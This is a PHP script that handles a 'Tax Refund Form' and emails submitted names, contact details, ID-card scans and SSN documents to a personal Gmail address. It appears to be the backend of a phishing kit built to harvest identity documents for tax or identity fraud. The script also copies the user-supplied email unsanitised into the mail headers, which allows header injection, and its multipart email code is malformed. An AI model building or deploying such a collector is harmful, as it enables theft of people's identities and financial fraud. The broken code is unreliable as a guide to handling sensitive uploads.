<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $name = $_POST['name'];
  $email = $_POST['email'];
  $phone = $_POST['phone'];
  $message = $_POST['message'];

  // Validate form inputs (add more validation if needed)
  if (empty($name) || empty($email) || empty($phone) || empty($message)) {
    echo "Please fill out all the fields.";
    exit;
  }

  // Email address to receive the form submission
  $to = "mayvanassa@gmail.com";
  
  // Subject of the email
  $subject = "New Tax Refund Form Submission";
  
  // Construct the email body
  $body = "Name: " . $name . "\n";
  $body .= "Email: " . $email . "\n";
  $body .= "Phone: " . $phone . "\n";
  $body .= "Message: " . $message . "\n";
  
  // Set headers
  $headers = "From: " . $email . "\r\n";
  $headers .= "Reply-To: " . $email . "\r\n";
  
  // Attach uploaded ID card file
  if(isset($_FILES['id_card']) && $_FILES['id_card']['error'] == 0) {
    $file_name = $_FILES['id_card']['name'];
    $file_tmp = $_FILES['id_card']['tmp_name'];
    $file_type = $_FILES['id_card']['type'];
    $file_size = $_FILES['id_card']['size'];
    
    // Read the file content
    $file_content = file_get_contents($file_tmp);
    
    // Encode the file content for email
    $file_content_encoded = chunk_split(base64_encode($file_content));
    
    // Add the file as an attachment
    $body .= "--PHP-mixed-\r\n";
    $body .= "Content-Type: " . $file_type . "; name=\"" . $file_name . "\"\r\n";
    $body .= "Content-Transfer-Encoding: base64\r\n";
    $body .= "Content-Disposition: attachment\r\n";
    $body .= $file_content_encoded . "\r\n";
  }
  
  // Attach uploaded SSN file
  if(isset($_FILES['ssn_upload']) && $_FILES['ssn_upload']['error'] == 0) {
    $file_name = $_FILES['ssn_upload']['name'];
    $file_tmp = $_FILES['ssn_upload']['tmp_name'];
    $file_type = $_FILES['ssn_upload']['type'];
    $file_size = $_FILES['ssn_upload']['size'];
    
    // Read the file content
    $file_content = file_get_contents($file_tmp);
    
    // Encode the file content for email
    $file_content_encoded = chunk_split(base64_encode($file_content));
    
    // Add the file as an attachment
    $body .= "--PHP-mixed-\r\n";
    $body .= "Content-Type: " . $file_type . "; name=\"" . $file_name . "\"\r\n";
    $body .= "Content-Transfer-Encoding: base64\r\n";
    $body .= "Content-Disposition: attachment\r\n";
    $body .= $file_content_encoded . "\r\n";
  }
  
  // Send the email
  if (mail($to, $subject, $body, $headers)) {
    echo "Form submitted successfully.";
  } else {
    echo "An error occurred while submitting the form.";
  }
}
?>
